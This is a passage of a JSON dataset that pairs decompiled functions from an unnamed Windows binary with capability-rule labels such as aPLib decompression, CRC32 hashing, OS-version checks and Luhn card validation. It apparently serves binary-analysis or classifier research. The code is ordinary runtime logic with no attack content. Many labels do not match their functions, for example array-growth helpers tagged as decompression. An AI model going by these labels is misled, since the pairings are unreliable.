            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004090a0(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00407350();\n    iVar2 = fcn.00409150();\n    uVar3 = arg_8h;\n    if ((uVar1 <= iVar2 - (uVar1 >> 1)) && (uVar3 = (uVar1 >> 1) + uVar1,  uVar3 < arg_8h)) {\n        uVar3 = arg_8h;\n    }\n    return uVar3;\n}\n",
        "token_count": 165
    },
    "00409230": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00409230(uint32_t arg_8h)\n\n{\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_ch = fcn.00407890();\n    var_18h = fcn.00404960();\n    var_8h = arg_8h | 7;\n    if ((var_8h <= var_ch) && (var_10h = *(var_18h + 0x14),  var_10h <= var_ch - (var_10h >> 1))) {\n        var_1ch = (var_10h >> 1) + var_10h;\n        fcn.00406a60(&var_8h, &var_1ch);\n    }\n    fcn.0043a2e7(var_1ch);\n    return;\n}\n",
        "token_count": 262
    },
    "00409410": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00409410(uint32_t arg_8h)\n\n{\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_ch = fcn.004069e0();\n    var_18h = fcn.00404960();\n    var_8h = arg_8h | 0xf;\n    if ((var_8h <= var_ch) && (var_10h = *(var_18h + 0x14),  var_10h <= var_ch - (var_10h >> 1))) {\n        var_1ch = (var_10h >> 1) + var_10h;\n        fcn.00406a60(&var_8h, &var_1ch);\n    }\n    fcn.0043a2e7(var_1ch);\n    return;\n}\n",
        "token_count": 264
    },
    "00417b70": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00417b70(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00417140();\n    iVar2 = fcn.00417170();\n    uVar3 = arg_8h;\n    if ((uVar1 <= iVar2 - (uVar1 >> 1)) && (uVar3 = (uVar1 >> 1) + uVar1,  uVar3 < arg_8h)) {\n        uVar3 = arg_8h;\n    }\n    return uVar3;\n}\n",
        "token_count": 165
    },
    "0041dce0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041dce0(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0041d5e0();\n    iVar2 = fcn.0041dd90();\n    uVar3 = arg_8h;\n    if ((uVar1 <= iVar2 - (uVar1 >> 1)) && (uVar3 = (uVar1 >> 1) + uVar1,  uVar3 < arg_8h)) {\n        uVar3 = arg_8h;\n    }\n    return uVar3;\n}\n",
        "token_count": 170
    },
    "004125c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004125c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.004123a0(arg_14h, arg_18h);\n    // switch table (6 cases) at 0x412648\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.00412580(arg_8h, arg_ch, arg_10h);\n        break;\n    case 1:\n    case 2:\n        uVar1 = fcn.00412580(arg_8h, arg_ch, arg_10h);\n        break;\n    case 3:\n        uVar1 = fcn.00412580(arg_8h, arg_ch, arg_10h);\n        break;\n    case 4:\n    case 5:\n        uVar1 = fcn.00412580(arg_8h, arg_ch, arg_10h);\n        break;\n    default:\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 256
    },
    "0045763b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045763b(uint32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    if (9 < arg_8h) {\n        return 1;\n    }\n    // switch table (10 cases) at 0x457737\n    switch(*(arg_8h * 4 + 0x457737)) {\n    case 0x457653:\n        uVar2 = fcn.00456d58(arg_ch, arg_10h);\n        return uVar2;\n    case 0x457662:\n        uVar2 = fcn.00456d9e(arg_ch, arg_10h);\n        return uVar2;\n    case 0x45766f:\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f;\n        break;\n    case 0x45768d:\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f | 0x7ff00000;\n        break;\n    case 0x4576a6:\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f | 0x7fffffff;\n        *arg_10h = 0xffffffff;\n        goto code_r0x00457686;\n    case 0x4576c5:\n        fcn.00456b86(*(arg_ch + 0x308), arg_10h);\n        return 0;\n    case 0x4576dc:\n        *arg_10h = 0;\n        arg_10h[1] = 0xfff80000;\n        return 0;\n    case 0x4576eb:\n        *arg_10h = 0;\n        arg_10h[1] = 0;\n        return 1;\n    case 0x4576fa:\n        uVar2 = 2;\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f;\n        goto code_r0x0045770d;\n    case 0x457719:\n        uVar2 = 3;\n        uVar1 = (*(arg_ch + 0x308) != '\\0') << 0x1f | 0x7ff00000;\ncode_r0x0045770d:\n        *arg_10h = 0;\n        arg_10h[1] = uVar1;\n        return uVar2;\n    }\n    *arg_10h = 0;\ncode_r0x00457686:\n    arg_10h[1] = uVar1;\n    return 0;\n}\n",
        "token_count": 603
    },
    "0041d610": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d610(uint arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.00408d50(arg_8h, arg_ch << 5);\n    return;\n}\n",
        "token_count": 55
    },
    "0041d7d0": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint32_t fcn.0041d7d0(int32_t param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_8h;\n    uint arg_ch;\n    uint arg_10h;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    int32_t iVar7;\n    int32_t arg_10h_00;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471bb0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    piVar1 = fcn.004072d0();\n    iVar6 = var_8h - *piVar1 >> 5;\n    uVar2 = fcn.00404960();\n    iVar3 = fcn.0041ddd0();\n    iVar4 = fcn.0041dd90();\n    if (iVar3 == iVar4) {\n        fcn.00408ff0();\n    }\n    arg_8h = fcn.0041dce0(iVar3 + 1);\n    iVar4 = fcn.0041de60(arg_8h);\n    var_4h = 0;\n    arg_ch = fcn.00401440(iVar6 * 0x20 + iVar4);\n    arg_10h = fcn.00401440(var_ch_2);\n    fcn.0041d7a0(uVar2, arg_ch, arg_10h);\n    piVar1 = fcn.00404940();\n    if (var_8h == *piVar1) {\n        iVar7 = iVar4;\n        puVar5 = fcn.00404940();\n        uVar2 = *puVar5;\n        puVar5 = fcn.004072d0();\n        fcn.0041dd30(*puVar5, uVar2, iVar7);\n    }\n    else {\n        iVar7 = var_8h;\n        arg_10h_00 = iVar4;\n        puVar5 = fcn.004072d0();\n        fcn.0041dd60(*puVar5, iVar7, arg_10h_00);\n        iVar7 = iVar4 + 0x20 + iVar6 * 0x20;\n        puVar5 = fcn.00404940();\n        fcn.0041dd60(var_8h, *puVar5, iVar7);\n    }\n    var_4h = 0xffffffff;\n    fcn.0041dc40(iVar4, iVar3 + 1, arg_8h);\n    piVar1 = fcn.004072d0();\n    iVar3 = *piVar1;\n    *in_FS_OFFSET = var_ch_3;\n    return iVar6 * 0x20 + iVar3;\n}\n",
        "token_count": 759
    },
    "0041e320": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041e320(uint32_t arg_8h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = arg_8h << 5;\n    if (0x7ffffff < arg_8h) {\n        var_4h = -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 86
    },
    "00447552": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00447552(uint32_t arg_8h)\n\n{\n    if (10 < arg_8h) {\n        arg_8h = 10;\n    }\n    return *(arg_8h * 4 + 0x4910e0);\n}\n",
        "token_count": 61
    },
    "00438ed8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00438ed8(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    while (*0x491008 < 10) {\n        iVar1 = *0x491008 * 4;\n        *0x491008 = *0x491008 + 1;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*(iVar1 + 0x495334), uVar2);\n        if (pcVar3 != NULL) {\n            (**0x4742a4)();\n            (*pcVar3)();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 234
    },
    "0046710c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.0046710c(int16_t **arg_8h, int16_t **arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *arg_10h;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int16_t **ppiVar8;\n    int16_t **arg_8h_00;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int16_t *var_34h;\n    uint var_30h;\n    int16_t **var_2ch;\n    int16_t **var_28h;\n    uint var_24h;\n    int16_t **var_20h;\n    int16_t *var_1ch;\n    int16_t *var_18h;\n    int16_t **var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    ushort var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_20h = arg_ch;\n    var_14h = arg_8h;\n    if (arg_ch == NULL) {\n        puVar3 = fcn.0045652e();\n        *puVar3 = 0x16;\n        fcn.004559dd();\n    }\n    else {\n        uVar10 = 0;\n        *arg_ch = NULL;\n        piVar5 = *arg_8h;\n        var_2ch = NULL;\n        var_28h = NULL;\n        var_24h = 0;\n        ppiVar8 = var_2ch;\n        while (var_2ch = ppiVar8,  piVar5 != NULL) {\n            var_ch = 0x3f002a;\n            var_8h = 0;\n            var_14h = arg_8h;\n            iVar4 = fcn.00468d3c(piVar5, &var_ch);\n            if (iVar4 == 0) {\n                var_10h = fcn.00466e20(*arg_8h, 0, 0, &var_2ch);\n            }\n            else {\n                var_10h = fcn.00466ed6(*arg_8h, iVar4, &var_2ch);\n            }\n            ppiVar8 = var_2ch;\n            if (var_10h != 0) goto code_r0x00466dc5;\n            arg_8h = var_14h + 1;\n            piVar5 = *arg_8h;\n        }\n        var_10h = 0;\n        var_1ch = (var_28h - ppiVar8 >> 2) + 1;\n        uVar9 = ~-(var_28h < ppiVar8) & (var_28h - ppiVar8) + 3U >> 2;\n        var_14h = ppiVar8;\n        if (uVar9 != 0) {\n            uVar7 = 0;\n            do {\n                piVar5 = *var_14h;\n                var_18h = piVar5 + 1;\n                do {\n                    iVar1 = *piVar5;\n                    piVar5 = piVar5 + 1;\n                } while (iVar1 != 0);\n                var_10h = var_10h + 1 + (piVar5 - var_18h >> 1);\n                var_14h = var_14h + 1;\n                uVar7 = uVar7 + 1;\n            } while (uVar7 != uVar9);\n        }\n        piVar5 = fcn.0045ef1c(var_1ch, var_10h, 2);\n        if (piVar5 == NULL) {\n            var_10h = -1;\n        }\n        else {\n            var_34h = piVar5 + var_1ch * 2;\n            var_1ch = var_34h;\n            var_14h = ppiVar8;\n            if (ppiVar8 != var_28h) {\n                var_ch = piVar5 - ppiVar8;\n                do {\n                    arg_10h = *var_14h;\n                    piVar6 = arg_10h;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != 0);\n                    var_18h = (piVar6 - (arg_10h + 1) >> 1) + 1;\n                    iVar4 = fcn.0046116d(var_1ch, var_10h - (var_1ch - var_34h >> 1), arg_10h, var_18h);\n                    if (iVar4 != 0) {\n                        fcn.00455a0a(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    *(var_ch + var_14h) = var_1ch;\n                    var_14h = var_14h + 1;\n                    var_1ch = var_1ch + var_18h;\n                } while (var_14h != var_28h);\n            }\n            var_10h = 0;\n            *var_20h = piVar5;\n        }\n        fcn.004612d2(0);\ncode_r0x00466dc5:\n        uVar9 = ~-(var_28h < ppiVar8) & var_28h + (3 - ppiVar8) >> 2;\n        arg_8h_00 = ppiVar8;\n        var_20h = ppiVar8;\n        var_ch = uVar9;\n        if (uVar9 != 0) {\n            do {\n                fcn.004612d2(*ppiVar8);\n                uVar10 = uVar10 + 1;\n                ppiVar8 = ppiVar8 + 1;\n                arg_8h_00 = var_2ch;\n            } while (uVar10 != uVar9);\n        }\n        fcn.004612d2(arg_8h_00);\n    }\n    fcn.0043a2e7(var_34h);\n    return;\n}\n",
        "token_count": 1435
    },
    "0044db9a": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044db9a(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    fcn.00441ab3(*in_ECX);\n    uVar1 = 0;\n    uVar2 = *in_ECX + 0x1fU >> 5;\n    if (uVar2 != 0) {\n        do {\n            *(*(arg_8h + 4) + uVar1 * 4) = *(*(arg_ch + 4) + uVar1 * 4) & *(in_ECX[1] + uVar1 * 4);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < uVar2);\n    }\n    return arg_8h;\n}\n",
        "token_count": 203
    },
    "0045220d": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045220d(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_10h == 1) {\n        uVar6 = *arg_8h;\n        uVar4 = *arg_ch;\ncode_r0x00453d36:\n        if (uVar6 == uVar4) {\n            return 0;\n        }\n        return (0 < uVar6 - uVar4) * 2 + -1;\n    }\n    if (arg_10h == 2) {\n        iVar5 = *arg_8h - *arg_ch;\n        if (iVar5 == 0) {\n            uVar6 = *(arg_8h + 1);\n            uVar4 = *(arg_ch + 1);\n            goto code_r0x00453d36;\n        }\ncode_r0x00453d22:\n        return (0 < iVar5) * 2 + -1;\n    }\n    if (arg_10h == 3) {\n        iVar5 = *arg_8h - *arg_ch;\n        if ((iVar5 == 0) && (iVar5 = *(arg_8h + 1) - *(arg_ch + 1),  iVar5 == 0)) {\n            uVar6 = *(arg_8h + 2);\n            uVar4 = *(arg_ch + 2);\n            goto code_r0x00453d36;\n        }\n        goto code_r0x00453d22;\n    }\n    if (arg_10h == 4) {\n        iVar5 = *arg_8h - *arg_ch;\n        if (((iVar5 == 0) && (iVar5 = *(arg_8h + 1) - *(arg_ch + 1),  iVar5 == 0)) &&\n           (iVar5 = *(arg_8h + 2) - *(arg_ch + 2),  iVar5 == 0)) {\n            uVar6 = *(arg_8h + 3);\n            uVar4 = *(arg_ch + 3);\n            goto code_r0x00453d36;\n        }\n        goto code_r0x00453d22;\n    }\n    bVar8 = arg_10h < 0x20;\n    while (!bVar8) {\n        uVar4 = *arg_8h;\n        uVar6 = *arg_ch;\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        uVar4 = arg_8h[1];\n        uVar6 = arg_ch[1];\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        uVar4 = arg_8h[2];\n        uVar6 = arg_ch[2];\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        uVar4 = arg_8h[3];\n        uVar6 = arg_ch[3];\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        uVar4 = arg_8h[4];\n        uVar6 = arg_ch[4];\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        uVar4 = arg_8h[5];\n        uVar6 = arg_ch[5];\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        uVar4 = arg_8h[6];\n        uVar6 = arg_ch[6];\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        uVar4 = arg_8h[7];\n        uVar6 = arg_ch[7];\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        arg_10h = arg_10h - 0x20;\n        arg_8h = arg_8h + 8;\n        arg_ch = arg_ch + 8;\n        bVar8 = arg_10h < 0x20;\n    }\n    // switch table (32 cases) at 0x453da1\n    switch(arg_10h) {\n    default:\n        goto code_r0x00452d68;\n    case 1:\n        goto code_r0x00453269;\n    case 2:\n        goto code_r0x00453790;\n    case 3:\n        goto code_r0x00453cca;\n    case 4:\n        goto code_r0x00452cc0;\n    case 5:\n        goto code_r0x004531b5;\n    case 6:\n        goto code_r0x004536d6;\n    case 7:\n        goto code_r0x00453c10;\n    case 8:\n        goto code_r0x00452c06;\n    case 9:\n        goto code_r0x004530fb;\n    case 10:\n        goto code_r0x00453622;\n    case 0xb:\n        goto code_r0x00453b5c;\n    case 0xc:\n        goto code_r0x00452b4c;\n    case 0xd:\n        goto code_r0x00453047;\n    case 0xe:\n        goto code_r0x00453568;\n    case 0xf:\n        goto code_r0x00453aa8;\n    case 0x10:\n        goto code_r0x00452a92;\n    case 0x11:\n        goto code_r0x00452f8d;\n    case 0x12:\n        goto code_r0x004534b4;\n    case 0x13:\n        goto code_r0x004539f4;\n    case 0x14:\n        goto code_r0x004529de;\n    case 0x15:\n        goto code_r0x00452ed9;\n    case 0x16:\n        goto code_r0x004533fa;\n    case 0x17:\n        goto code_r0x00453940;\n    case 0x18:\n        goto code_r0x00452924;\n    case 0x1a:\n        goto code_r0x00453346;\n    case 0x1b:\n        goto code_r0x00453886;\n    case 0x1c:\n        uVar4 = *(arg_8h + (arg_10h - 0x1c));\n        uVar6 = *(arg_ch + (arg_10h - 0x1c));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n             